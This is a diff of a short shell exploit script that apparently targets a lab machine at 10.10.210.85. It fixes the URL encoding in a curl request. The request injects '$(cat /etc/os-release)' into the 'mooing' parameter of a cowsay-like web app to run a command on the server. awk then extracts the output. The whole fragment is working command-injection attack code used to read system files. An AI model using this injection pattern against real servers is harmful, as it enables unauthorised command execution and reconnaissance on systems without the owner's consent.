@@ -28,5 +28,5 @@ echo "--> App run as : $(awk 'BEGIN { RS="<pre>|</pre>"; FS="\n" } NR % 2 == 0 {
 
 # Linux release
 echo "4 - GETTING LINUX VERSION"
-curl -s -X GET "http://10.10.210.85:82/?cow=default&mooing=%24%28cat+%2Fetc%os-release%29" > /work/release.html
+curl -s -X GET "http://10.10.210.85:82/?cow=default&mooing=%24%28cat+%2Fetc%2Fos-release%29" > /work/release.html
 echo "--> Linux version is : $(awk 'BEGIN { RS="<pre>|</pre>"; FS="\n" } NR % 2 == 0 { print }' /work/release.html)"
